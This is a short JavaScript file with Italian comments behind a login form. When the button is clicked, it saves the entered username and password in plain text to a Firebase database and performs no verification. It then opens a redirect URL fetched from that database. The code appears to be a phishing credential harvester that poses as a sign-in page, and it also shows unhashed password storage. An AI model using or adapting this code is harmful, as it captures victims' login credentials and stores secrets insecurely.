let NomeUtente,Password;
const btnAcces = document.getElementById("btnAccedi");

//-----------Aqcuisizione dati--------------------//

NomeUtente = document.getElementById("Nome/Email").value;
Password = document.getElementById("Password").value;

//-----------Spedizione dati--------------------//

btnAcces.addEventListener('click', () => {
  console.log("accesso");
  const database = firebase.database();
  database.ref("/Utenti/"+NomeUtente).set({
  nome:NomeUtente,
  password:Password,
  })
  apriLink();
});

  //--------------Controllo dati----------------------//

setInterval(() => {
NomeUtente = document.getElementById("Nome/Email").value;
Password = document.getElementById("Password").value;
if(NomeUtente != "" && Password != ""){
  document.getElementById("btnAccedi").disabled=false;
}
else {
  document.getElementById("btnAccedi").disabled=true;
}}, 500);

function apriLink(){
const dbRef = firebase.database().ref();
  dbRef.child("/Link/Link").get().then((snapshot) => {
    open(snapshot.val());
  });
}
